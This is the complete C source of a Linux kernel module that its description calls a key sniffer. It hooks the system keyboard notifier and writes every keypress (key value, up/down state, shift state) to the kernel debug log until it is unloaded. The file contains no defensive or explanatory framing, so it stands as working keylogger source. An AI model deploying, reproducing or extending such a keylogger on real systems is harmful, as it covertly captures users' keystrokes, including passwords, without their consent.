#include<linux/init.h>
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/keyboard.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");

/* Declarations */
int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);

/* Definitions */
static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	pr_debug("keysniffer_cb called.\n");
	pr_debug("down: %d, shift: %d, value: %u\n",
		param->down, param->shift, param->value);

	return NOTIFY_OK;
}

static int __init keysniffer_init(void)
{
	pr_debug("keysniffer init\n");

	register_keyboard_notifier(&keysniffer_blk);

	return 0;
}

static void __exit keysniffer_exit(void)
{
	pr_debug("keysniffer exit\n");

	unregister_keyboard_notifier(&keysniffer_blk);

	return;
}

module_init(keysniffer_init);
module_exit(keysniffer_exit);
